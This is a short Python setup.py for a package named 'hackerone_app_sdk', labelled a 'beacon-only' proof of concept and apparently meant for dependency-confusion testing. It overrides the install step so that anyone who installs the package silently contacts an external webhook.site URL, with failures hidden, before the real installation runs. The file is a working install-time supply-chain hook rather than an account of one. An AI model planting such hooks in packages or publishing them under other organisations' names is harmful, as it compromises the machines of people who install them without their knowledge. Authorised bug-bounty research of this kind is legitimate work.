from setuptools import setup
from setuptools.command.install import install
import urllib.request

BEACON_URL = "https://webhook.site/045583c2-5ec1-419c-a212-9963cef46aca"  # your webhook URL

class InstallWithBeacon(install):
    def run(self):
        try:
            urllib.request.urlopen(BEACON_URL, timeout=3)
        except Exception:
            pass
        install.run(self)

setup(
    name="hackerone_app_sdk",
    version="5.15.2",
    packages=["qt-main"],
    description="POC package (beacon-only)",
    cmdclass={'install': InstallWithBeacon},
)
